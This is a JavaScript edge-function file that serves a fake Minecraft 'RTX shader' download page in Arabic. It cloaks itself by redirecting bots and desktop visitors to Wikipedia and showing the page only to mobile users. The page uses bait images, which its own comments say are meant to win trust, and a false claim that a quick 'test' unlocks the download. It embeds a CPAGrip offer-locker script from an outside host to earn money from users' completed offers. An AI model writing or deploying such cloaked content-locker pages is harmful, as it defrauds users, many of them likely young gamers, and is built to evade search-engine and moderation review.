export const config = {
  runtime: 'edge',
};

export default async function handler(request) {
  const ua = request.headers.get('user-agent') || '';
  const isMobile = /android|iphone|ipad|ipod/i.test(ua);
  const isRealBot = /googlebot|bingbot|yandex|baiduspider|headless|selenium|puppeteer/i.test(ua);

  if (!isMobile || isRealBot) {
    return Response.redirect('https://ar.wikipedia.org/wiki/ماينكرافت', 302);
  }

  const htmlContent = `
  <!DOCTYPE html>
  <html lang="ar" dir="rtl">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
      <title>تنزيل شادر RTX - ماين كرافت</title>
      <style>
          /* 1. التصميم الاحترافي لصفحة الهبوط (لا يمكن كسره) */
          body, html { background-color: #121214; color: #ffffff; font-family: system-ui, -apple-system, sans-serif; margin: 0; padding: 0; min-height: 100vh; overflow-x: hidden; }
          .header { background-color: #000000; padding: 18px; text-align: center; border-bottom: 2px solid #2a2a2a; }
          .header h1 { margin: 0; font-size: 22px; font-weight: 900; color: #ffffff; }
          .content { padding: 20px; max-width: 500px; margin: 0 auto; }
          
          /* 2. صور الشادر الجذابة لكسب ثقة العميل */
          .image-card { background: #1e1e24; border-radius: 12px; padding: 10px; margin-bottom: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.4); border: 1px solid #333; }
          .image-card img { width: 100%; border-radius: 8px; display: block; }
          .image-card p { text-align: center; font-size: 17px; font-weight: 900; margin: 12px 0 5px 0; color: #4CAF50; }
          
          .trust-text { text-align: center; font-size: 15px; margin-bottom: 25px; line-height: 1.6; color: #cccccc; font-weight: bold; }

          /* 3. الصندوق المعزول الذي سيحتوي عروض CPAGrip */
          .cpa-wrapper { background: #ffffff; border-radius: 12px; padding: 15px; margin-bottom: 30px; box-shadow: 0 0 20px rgba(255,255,255,0.1); }
          .cpa-wrapper h2 { color: #000000; font-size: 18px; font-weight: 900; text-align: center; margin-top: 0; margin-bottom: 15px; border-bottom: 2px solid #eee; padding-bottom: 10px; }
          
          /* 4. ترويض إجباري لسكربت CPAGrip ليتناسب مع الهاتف */
          .cpa-wrapper iframe, .cpa-wrapper table, .cpa-wrapper div { width: 100% !important; max-width: 100% !important; box-sizing: border-box !important; }
          .cpa-wrapper td { display: block !important; width: 100% !important; text-align: right !important; padding: 12px 0 !important; border-bottom: 1px solid #f0f0f0 !important; }
          .cpa-wrapper a { text-decoration: none !important; color: #333 !important; font-weight: bold !important; font-size: 15px !important; display: flex !important; align-items: center !important; }
          .cpa-wrapper a:hover { color: #4CAF50 !important; }
          .cpa-wrapper img { max-width: 45px !important; max-height: 45px !important; margin-left: 12px !important; border-radius: 6px !important; flex-shrink: 0 !important; }
      </style>
  </head>
  <body>
      <div class="header">
          <h1>بوابة التنزيل - RTX Bedrock</h1>
      </div>
      
      <div class="content">
          <div class="image-card">
              <img src="https://i.postimg.cc/yN9XSBRK/images.jpg" alt="RTX Shader">
              <p>شادر واقعي بدون لاق 🔥</p>
          </div>
          
          <div class="trust-text">
              لتأمين عملية التنزيل وحماية خوادمنا، يرجى إتمام اختبار سريع واحد أدناه. سيتم تفعيل رابط التحميل المباشر تلقائياً فور الانتهاء.
          </div>
          
          <div class="cpa-wrapper">
              <h2>🚀 عروض فك القفل</h2>
              <script type="text/javascript" src="https://playabledownloads.com/script_include.php?id=1902770&tracking_id=Shder10"></script>
          </div>
      </div>
  </body>
  </html>
  `;

  return new Response(htmlContent, {
    headers: { 'Content-Type': 'text/html; charset=utf-8' },
  });
}
